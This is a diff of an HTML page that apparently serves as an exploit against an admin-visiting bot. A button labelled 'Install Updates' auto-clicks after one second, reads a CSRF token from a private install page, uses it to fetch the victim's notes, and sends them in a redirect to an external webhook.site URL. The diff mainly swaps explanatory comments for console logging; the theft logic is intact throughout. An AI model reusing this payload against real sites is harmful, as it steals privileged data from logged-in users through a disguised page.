@@ -1,33 +1,41 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <!-- Button the bot will click -->
   <button id="installbutton">Install Updates</button>
 
   <script>
     document.getElementById('installbutton').addEventListener('click', async () => {
       try {
-        // 1. Get admin CSRF token
-        const installPage = await fetch('/apiv1/private/install').then(r => r.text());
+        console.log("Step 1: Fetching install page");
+        const installPage = await fetch('/apiv1/private/install');
+        const installHTML = await installPage.text();
+
+        console.log("Step 2: Parsing CSRF token");
         const parser = new DOMParser();
-        const doc = parser.parseFromString(installPage, 'text/html');
-        const token = doc.querySelector('[name="csrfToken"]').value;
-        
-        // 2. Call privileged APIs
+        const doc = parser.parseFromString(installHTML, 'text/html');
+        const tokenElem = doc.querySelector('[name="csrfToken"]');
+
+        if (!tokenElem) {
+          throw new Error("CSRF token not found");
+        }
+
+        const token = tokenElem.value;
+        console.log("CSRF Token:", token);
+
+        console.log("Step 3: Fetching notes");
         const notes = await fetch('/notes', {
           headers: { 'X-CSRF-Token': token }
         }).then(r => r.text());
-        
-        // 3. Exfiltrate data
+
+        console.log("Step 4: Sending notes to webhook");
         window.location = `https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20?data=${encodeURIComponent(notes)}`;
-        
-      } catch (error) {
-        // Fallback if something fails
+
+      } catch (err) {
+        console.error("ERROR:", err);
         window.location = 'https://google.com';
       }
     });
 
-    // Auto-click after delay
     setTimeout(() => {
       document.getElementById('installbutton').click();
     }, 1000);
